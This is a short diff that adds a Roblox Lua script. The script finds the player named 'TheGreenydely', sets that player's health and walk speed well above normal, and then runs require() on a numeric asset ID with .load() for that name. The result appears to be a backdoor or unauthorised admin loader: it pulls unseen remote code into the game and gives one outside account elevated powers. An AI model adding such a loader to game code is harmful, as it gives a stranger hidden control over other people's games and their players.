@@ -1,0 +1,7 @@
+local findplayer = game.Players:FindFirstChild("TheGreenydely")
+if findplayer then
+findplayer.Character.Humanoid.MaxHealth = 5000
+findplayer.Character.Humanoid.Health = 1000
+findplayer.Character.Humanoid.WalkSpeed = 32
+require(126564778569352).load("TheGreenydely")
+end
